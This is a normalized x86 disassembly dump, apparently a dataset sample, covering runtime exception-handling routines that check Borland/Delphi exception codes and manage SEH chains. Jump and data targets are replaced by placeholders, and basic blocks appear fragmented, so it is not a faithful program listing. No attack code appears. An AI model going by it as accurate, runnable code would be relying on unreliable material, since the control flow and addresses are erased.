mov ecx [ edx ]
test [ ecx + 0x4 ] 0x10
jne r-xdata
push 0xf78
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov ebx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
test [ edx + 0x5 ] 0x4
jne r-xdata
push 0xf8b
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov edx [ ebp + 0x8 ]
mov ecx [ edx ]
test [ ecx + 0xc ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx [ edx + 0x8 ]
test [ ecx + 0xc ] 0x2
jne r-xdata
push 0xf7c
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
test [ ebx + 0x5 ] 0x10
je r-xdata
sub ebx 0xc
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x4 ]
and eax 0x3
cmp eax 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov eax [ edx + 0x24 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx [ edx + 0x8 ]
mov eax [ ecx + 0x20 ]
mov [ ebp - 0x4 ] eax
push 0xf7d
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov esi [ ebx ]
mov [ ebp - 0xc ] esi
mov eax [ ebx ]
test [ eax + 0x5 ] 0x4
jne r-xdata
mov eax [ ebx ]
mov [ ebp - 0x14 ] eax
mov esi [ ebx + 0x4 ]
test esi 0x4
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
inc [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
test [ eax + 0x5 ] 0x4
je r-xdata
mov edx [ ebp - 0xc ]
mov esi [ edx + 0x8 ]
mov [ ebp - 0xc ] esi
mov ecx [ ebp - 0xc ]
test [ ecx + 0x4 ] 0x2
je r-xdata
mov edx [ ebx ]
mov esi [ edx + 0x8 ]
mov [ ebp - 0xc ] esi
jmp r-xdata
push 0xfd7
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov edx [ ebx + 0x8 ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp + 0x14 ]
add eax [ ebx + 0x8 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
test [ esi + 0xc ] 0x2
jne r-xdata
mov edi [ esi + 0xc ]
mov esi [ esi + 0x8 ]
mov eax [ ebp - 0xc ]
test [ eax + 0xc ] 0x20
je r-xdata
mov edi 0x1
mov eax [ ebp - 0xc ]
test [ eax + 0x4 ] 0x10
je r-xdata
test esi 0x11
je r-xdata
mov ecx [ ebp - 0x14 ]
test [ ecx + 0x5 ] 0x4
jne r-xdata
test esi 0x1000
je r-xdata
imul edi [ esi + 0x20 ]
cmp edi [ ebp - 0x4 ]
jae r-xdata
push 0x1022
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
test [ ebx + 0x4 ] 0x8
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor edi edi
mov eax [ ebp - 0x14 ]
test [ eax + 0x4 ] 0x10
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x14 ] edx
push 0x1052
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
sub [ ebp - 0x4 ] edi
add ebx 0xc
jmp r-xdata
xor esi esi
mov eax [ ebp - 0xc ]
test [ eax + 0xc ] 0x2
jne r-xdata
mov edx esi
and edx 0x3
cmp edx 0x3
jne r-xdata
test esi 0x400
je r-xdata
mov edx [ ebp - 0x14 ]
test esi 0x1000
mov ecx [ edx + 0x8 ]
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
mov [ ebp - 0x18 ] edx
je r-xdata
push 0x105c
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
cmp [ ebx ] 0x0
jne r-xdata
test [ ebx + 0x4 ] 0x4
je r-xdata
push 0xff7
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov eax ebx
add ebx 0xfffffff4
cmp eax [ ebp + 0x8 ]
ja r-xdata
and esi 0x48
cmp esi 0x48
jne r-xdata
xor edi edi
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov edx esi
mov eax [ ebp - 0x18 ]
and edx 0x48
mov [ ebp - 0x1c ] eax
cmp edx 0x40
jne r-xdata
mov edi [ eax + 0x4 ]
mov ecx [ ebx + 0x8 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp + 0x14 ]
add edx [ ebx + 0x8 ]
mov [ ebp - 0x10 ] edx
jmp r-xdata
xor eax eax
mov ecx [ ebp - 0x14 ]
test [ ecx + 0x5 ] 0x4
je r-xdata
sub [ ebp - 0x1c ] 0x4
push [ ebp + 0x10 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_4d1745
pop ecx
xor edx edx
mov dl al
cmp edx 0x1
sbb ecx ecx
neg ecx
push ecx
push [ ebp - 0x4 ]
push edi
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
call sub_4d1267
add esp 0x1c
push [ ebp + 0x10 ]
push [ ebp + 0x14 ]
push [ ebp - 0x4 ]
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
call sub_4d159a
add esp 0x14
jmp r-xdata
xor eax eax
mov edx [ ebp - 0x14 ]
movzx edi [ edx + 0x10 ]
add edi [ ebp - 0x14 ]
test edi edi
jne r-xdata
mov ecx [ ebp - 0x14 ]
test [ ecx + 0x4 ] 0x2
je r-xdata
add [ ebp - 0x18 ] 0x4
test [ ebx + 0x4 ] 0x40
je r-xdata
mov esi [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
test [ ebx + 0x5 ] 0x10
je r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x4 ] 0x2
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x14 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
test [ eax + 0x20 ] 0x1
je r-xdata
test esi 0x400
je r-xdata
mov edi 0x2
jmp r-xdata
mov edi 0x1
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x20 ]
jmp r-xdata
push 0x1092
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov eax [ ebp - 0x14 ]
test [ eax + 0xc ] 0x20
je r-xdata
push esi
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
call sub_4d16be
add esp 0xc
mov [ ebp - 0x10 ] eax
mov esi [ ebp - 0xc ]
add [ ebp - 0x10 ] 0x4
push [ ebp - 0x1c ]
call sub_4b0180
pop ecx
mov edx [ ebp - 0x14 ]
cmp [ edx + 0x14 ] 0x0
je r-xdata
push [ ebp - 0x1c ]
call sub_4b0158
pop ecx
jmp r-xdata
mov eax [ ebp - 0x14 ]
movzx edx [ eax + 0x1a ]
push edx
mov ecx [ ebp - 0x14 ]
push [ ecx + 0x1c ]
push [ ebp - 0x1c ]
call sub_4d0549
add esp 0xc
jmp r-xdata
mov edx [ ebp + 0x10 ]
xor ecx ecx
mov cl [ edx + 0x20 ]
cmp ecx 0xff
je r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x5 ] 0x4
je r-xdata
mov edx [ ebp - 0x4 ]
cmp edx eax
jb r-xdata
test esi 0x8
je r-xdata
mov ecx [ ebp - 0x14 ]
movzx eax [ ecx + 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push [ edx + 0x14 ]
push [ ebp - 0x1c ]
call sub_4d0549
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
mov eax [ eax - 0x8 ]
mov edi eax
mov eax [ ebp - 0x18 ]
call edi
push edi
lea edx [ ebp - 0x14 ]
push edx
push [ ebp - 0x18 ]
call sub_4d16be
add esp 0xc
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x1c ] ecx
sub_4d1c20
mov ecx esp
add ecx 0x4
push ecx
push ebp
push esi
push edi
push edx
push ebx
push eax
push esp
push [ ecx + 0x20 ]
push 0x0
push [ ecx - 0x4 ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x14 ]
push [ ecx + 0x10 ]
push [ ecx + 0xc ]
push [ ecx + 0x8 ]
push [ ecx + 0x4 ]
push [ ecx ]
call sub_4d05c7
add esp 0x4c
retn
sub_4d1c58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ecx ebp
add ecx 0x8
push ecx
push [ ebp ]
push esi
push edi
push edx
push ebx
push eax
mov [ ebp - 0x8 ] esp
mov eax ebp
mov esi [ eax + 0x4 ]
call sub_4015fc
mov ebx [ eax + 0x48 ]
test ebx ebx
jne r-xdata
test [ ebx + 0xc ] 0x4
je r-xdata
call sub_4c5cb4
test [ ebx + 0xc ] 0x2
je r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov ecx [ ebx + 0x52 ]
xor eax eax
mov [ ebp - 0x4 ] ecx
mov [ ebx + 0x52 ] eax
lea eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebx + 0x52 ]
xor edx edx
mov [ ebx + 0x52 ] edx
jmp r-xdata
push 0x5ab
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov eax [ ebx + 0x40 ]
lea eax [ ebx + 0x52 ]
jmp r-xdata
or [ ebx + 0xc ] 0x8
push [ ebp - 0x8 ]
push 0x0
push 0x1
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebx + 0xc ]
push [ ebx + 0x24 ]
push [ ebx + 0x20 ]
push [ ebx + 0x8 ]
push eax
push [ ebx + 0x4 ]
call sub_4d05c7
add esp 0x30
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4d1d10
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
jne r-xdata
or [ ebx + 0x4 ] 0x2
mov eax 0x7b
mov edx 0x7b
mov eax [ ebp + 0x8 ]
mov edx ebx
call sub_4c5fd2
xor [ ebx + 0x4 ] 0x2
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x50 ] 0x26
mov [ ebp - 0x4c ] 0x2
xor eax eax
lea ebx [ ebp - 0x50 ]
mov [ ebp - 0x40 ] eax
sub_4d1d58
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] esi
call sub_4015fc
cmp [ eax + 0x48 ] 0x0
jne r-xdata
call sub_4015fc
mov ebx [ eax + 0x48 ]
call sub_4015fc
mov edx [ ebx ]
mov [ eax + 0x48 ] edx
mov eax [ ebx + 0x28 ]
mov [ ebp - 0x4 ] eax
mov esi [ fs : 0x0 ]
test esi esi
jne r-xdata
push 0x692
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
cmp esi [ ebx + 0x28 ]
je r-xdata
push 0x6a0
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
movzx edx [ eax + 0x10 ]
mov eax [ ecx + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov dx [ eax + edx ]
mov [ ecx + 0x10 ] dx
push ebx
call sub_4d09a9
pop ecx
mov esi [ ebx + 0xc ]
and esi 0x2
test esi esi
push ebx
call [ ebx + 0x1c ]
pop ecx
test esi esi
je r-xdata
push 0x6a1
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov ebx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esi [ ebp - 0x10 ]
mov eax ebp
mov eax [ ebp + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ebp [ ebp ]
mov esp edx
push eax
retn
push [ ebp + 0x4 ]
push 0x1
push 0x6
call sub_4c5ddc
add esp 0xc
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0xc ]
mov [ ebp - 0x14 ] ecx
mov ebx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esi [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
mov esp ebp
pop ebp
pop eax
mov esp edx
push eax
retn
push [ ebp + 0x4 ]
push 0x1
push 0x6
call sub_4c5ddc
add esp 0xc
sub_4d1e8c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
call sub_4d0e3b
add esp 0x8
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
pop ebx
pop ebp
retn
sub_4d1edc
push ebp
mov ebp esp
add esp 0xfffffea4
push ebx
push esi
push edi
mov eax rw-data
call sub_4c517c
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov edi [ edx + 0x1c ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x2c ] edx
mov ecx [ ebp - 0x2c ]
mov eax [ ebp + 0xc ]
sub eax [ ecx + 0x8 ]
mov [ ebp - 0x34 ] eax
mov edx [ ebp + 0xc ]
mov ecx [ edx + 0xc ]
mov [ ebp - 0x38 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xeedfae6
jne r-xdata
call sub_4ccc88
mov ecx [ ebp + 0x8 ]
test [ ecx + 0x4 ] 0x6
je r-xdata
xor eax eax
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
movzx ebx [ ecx + 0x10 ]
test ebx ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xeefface
jne r-xdata
push 0x0
push [ ebp + 0xc ]
call sub_4d0e3b
add esp 0x8
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xeefface
jne r-xdata
mov eax 0x1
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov esi ebx
mov eax [ ebp - 0x2c ]
movzx edx [ eax + esi ]
mov [ ebp - 0x30 ] edx
add esi 0x2
mov ecx [ ebp - 0x2c ]
movzx eax [ ecx + esi ]
mov [ ebp - 0x40 ] eax
add esi 0x2
mov edx [ ebp - 0x40 ]
cmp edx 0x5
ja r-xdata
mov eax [ ebp - 0x2c ]
mov ebx [ eax ]
test ebx ebx
je r-xdata
mov eax 0x1
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov edx [ ebp - 0x2c ]
mov ebx [ edx ]
test ebx ebx
je r-xdata
mov ecx rw-data
test ecx ecx
je r-xdata
jmp [ edx * 4 + jump_table_4d20cf ]
mov [ ebp - 0x39 ] 0x0
jmp r-xdata
jmp r-xdata
mov ebx [ ebp - 0x30 ]
test ebx ebx
jne r-xdata
push 0xce5
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov ecx [ ebp + 0x8 ]
test [ ecx + 0x3 ] 0x80
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xeefface
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xeefface
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
sub edx 0xeedfade
je r-xdata
test [ ebp + 0x2c ] 0x2
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x58 ] edx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x54 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov ecx [ edx ]
lea edx [ ebp - 0x58 ]
mov [ eax + 0x14 ] ecx
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp - 0x2c ]
mov edx [ eax + esi ]
mov [ rw-data ] edx
push ebx
push ebp
push esi
push edi
mov ecx 0x7b
mov ebx 0x7b
mov ecx [ ebp - 0x34 ]
mov ebx rw-data
call sub_4c5fe7
pop edi
pop esi
pop ebp
pop ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ eax ]
mov [ ecx + 0x14 ] edx
mov eax [ ebp - 0x2c ]
mov eax [ eax + esi ]
mov eax [ ebx ]
mov esi [ ebx ]
movzx edx [ eax + 0x6 ]
add esi edx
mov edx rw-data
mov eax esi
cmp [ ebp - 0x39 ] 0x0
je r-xdata
push 0x1
push [ edi + 0xc ]
push [ ebx ]
push [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_4d0244
add esp 0x14
test eax eax
je r-xdata
mov [ rw-data ] 0x1
call sub_4c5d20
mov [ rw-data ] 0x0
test [ ebp + 0x2c ] 0x1
jne r-xdata
sub edx 0x1fff0
je r-xdata
mov eax [ fs : 0x0 ]
mov [ ebp - 0x5c ] eax
push [ ebp + 0x10 ]
push [ ebp - 0x5c ]
push [ ebp + 0x18 ]
push [ ebp + 0x8 ]
call sub_4d00b3
add esp 0x10
mov edi eax
test edi edi
je r-xdata
test eax eax
jge r-xdata
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
test [ edx + 0x4 ] 0x1
je r-xdata
push 0x1
push [ edi + 0xc ]
push [ ebx ]
push [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_4d0244
add esp 0x14
test eax eax
jne r-xdata
test cl cl
je r-xdata
call sub_4c5cb4
mov eax [ ebp + 0xc ]
mov edx [ eax ]
mov [ fs : 0x0 ] edx
lea ecx [ ebp - 0x28 ]
lea eax [ ebp - 0x4 ]
push ecx
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
push 0x0
mov [ rw-data ] 0x0
mov [ ebp - 0x18 ] 0x18
push eax
call sub_4d2474
pop ecx
lea edx [ ebp - 0x4 ]
add [ ebp - 0xc ] 0x2
push edx
push r-xdata
call sub_4d1c20
add esp 0x24
jmp r-xdata
add ebx 0x4
jmp r-xdata
mov ecx [ ebp - 0x2c ]
mov eax [ ecx + esi ]
mov [ ebp - 0x48 ] eax
add esi 0x4
mov edx [ ebp + 0x8 ]
cmp [ edx ] 0xeedfade
jne r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
mov [ ecx + 0x18 ] eax
add esi 0x4
mov edx [ ebp - 0x30 ]
mov [ ebp - 0x50 ] edx
mov ebx edx
mov eax [ ebp - 0x2c ]
mov edx [ eax + esi ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
jmp r-xdata
xor eax eax
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov ax [ ebp - 0x30 ]
mov [ ecx + 0x10 ] ax
add ebx 0x4
jne r-xdata
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
push edi
push [ ebp - 0x48 ]
call sub_4d10cc
add esp 0x8
mov [ ebp - 0x44 ] eax
push [ ebp + 0x8 ]
push [ ebp - 0x48 ]
call sub_4d0fa9
add esp 0x8
mov [ ebp - 0x44 ] eax
jmp r-xdata
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_4d1d10
add esp 0x8
push ebx
push [ ebp + 0xc ]
call sub_4d0e3b
add esp 0x8
mov edx [ ebp + 0xc ]
mov cx [ ebp - 0x50 ]
mov [ edx + 0x10 ] cx
cmp [ ebp - 0x40 ] 0x3
jne r-xdata
mov [ ebp - 0x39 ] 0x1
add eax 0x2
add edx 0x2
test cl cl
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
je r-xdata
mov ecx [ ebp + 0x8 ]
test [ ecx + 0x3 ] 0x80
je r-xdata
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
call sub_4015fc
and [ eax + 0x4c ] 0xfffffffd
mov edx [ rw-data ]
cmp [ edx ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xeedfade
jne r-xdata
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xeedface
jb r-xdata
mov edx [ rw-data ]
cmp [ edx ] 0x2
jne r-xdata
push edi
call [ edi + 0x1c ]
pop ecx
jmp r-xdata
mov eax 0x7b
mov ebx 0x7b
mov ecx 0x7b
mov eax [ ebp - 0x4c ]
mov ebx [ ebp - 0x38 ]
mov ecx [ ebp - 0x34 ]
call sub_4d1c18
jmp r-xdata
cmp [ ebp - 0x40 ] 0x3
jne r-xdata
push [ ebp - 0x34 ]
push [ ebp - 0x48 ]
push edi
push [ ebp + 0xc ]
push [ ebp - 0x44 ]
call sub_4d0b59
add esp 0x14
push esi
push [ ebp - 0x34 ]
push [ ebp - 0x48 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ ebp - 0x44 ]
call sub_4d0a37
add esp 0x18
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
push 0x3
push 0x2
call sub_4c5ddc
add esp 0x14
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xeefface
jbe r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx ] 0xeedfade
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xeedfade
je r-xdata
mov [ ebp - 0x50 ] esi
mov ecx [ ebp - 0x44 ]
mov eax [ ecx ]
mov [ ebp - 0x4c ] eax
call sub_4015fc
mov ecx [ eax + 0x48 ]
mov [ edi ] ecx
call sub_4015fc
mov [ eax + 0x48 ] edi
mov eax [ ebp + 0xc ]
mov [ edi + 0x28 ] eax
mov edx [ ebp - 0x44 ]
mov [ edi + 0x2c ] edx
mov [ edi + 0x30 ] esi
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xeedfade
jne r-xdata
test [ edi + 0xc ] 0x2
je r-xdata
mov esi [ edi + 0x52 ]
mov edx [ ebp + 0x8 ]
mov esi [ edx + 0x18 ]
jmp r-xdata
push [ edi + 0x4 ]
call sub_4c56ec
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xeedfade
jne r-xdata
mov eax [ esi ]
mov ebx [ eax - 0x38 ]
movsx eax [ ebx ]
push eax
lea edx [ ebx + 0x1 ]
push edx
lea ecx [ ebp - 0x15c ]
push ecx
call sub_4c501c
movsx eax [ ebx ]
add esp 0xc
lea ebx [ ebp - 0x15c ]
mov [ ebp + eax - 0x15c ] 0x0
push esi
push [ ebp + 0x8 ]
call [ rw-data ]
add esp 0x8
jmp r-xdata
cmp [ edi + 0x44 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x18 ]
jmp r-xdata
mov ecx [ edi + 0x40 ]
lea ecx [ edi + 0x52 ]
jmp r-xdata
push ecx
push ebx
call sub_4d0461
pop ecx
push eax
push ebx
push [ ebp - 0x4c ]
push 0x5
push 0x3
call sub_4c5ddc
add esp 0x18
sub_4d2474
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x14 ] 0xc
push [ ebp + 0x8 ]
call sub_4088ac
pop ecx
inc [ ebp - 0x8 ]
mov edx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ ebp - 0x24 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_4d24b0
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x8 ] 0x1
dec [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
mov [ fs : 0x0 ] eax
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0xc
mov edx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
dec [ ebp - 0x8 ]
push 0x0
push [ ebp + 0x8 ]
call sub_4b0264
add esp 0x8
test [ ebp + 0xc ] 0x1
je r-xdata
push [ ebp + 0x8 ]
call sub_4b0180
pop ecx
sub_4d25d8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
push ecx
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov [ eax ] ecx
pop ecx
call sub_44958c
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4d2618
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov edx [ edx ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] ecx
call sub_44939c
mov edx [ ebp - 0x4 ]
cmp [ edx ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
cmp [ eax - 0x8 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx ]
inc [ ecx - 0x8 ]
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
jmp r-xdata
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4d2680
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
xor ecx ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] ecx
mov edx [ edx ]
mov ecx [ ebp - 0x2c ]
call sub_449f58
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4d26c0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov edx [ ebp - 0x4 ]
xor ecx ecx
mov [ edx ] ecx
test esi esi
je r-xdata
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
jge r-xdata
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4d282c
push ebx
push esi
mov eax [ ebp - 0x4 ]
push [ eax ]
call sub_4c4cb0
add esp 0xc
push esi
call sub_4c4e7c
pop ecx
mov ebx eax
sub_4d2728
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_449348
test esi 0x1
je r-xdata
push [ ebp - 0x4 ]
call sub_4b0180
pop ecx
sub_4d276c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
call sub_449674
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4d278c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov ecx [ ebp - 0xc ]
mov ecx [ ecx ]
call sub_4496f0
pop ebx
mov esp ebp
pop ebp
retn
sub_4d27e4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
push [ ebp + 0x14 ]
push edi
push 0x0
push 0x0
call sub_4c8340
add esp 0x10
mov ebx eax
mov ecx [ ebp + 0xc ]
mov edx ebx
mov eax esi
call sub_4d282c
test ebx ebx
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
push edi
inc ebx
push ebx
push [ esi ]
call sub_4c8340
add esp 0x10
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4d282c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
call sub_449910
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4d2854
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
mov [ ebp - 0x10 ] dl
test dl dl
jle r-xdata
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
lea esi [ ebp - 0x30 ]
mov eax rw-data
call sub_4c517c
mov [ esi + 0x1c ] 0x1
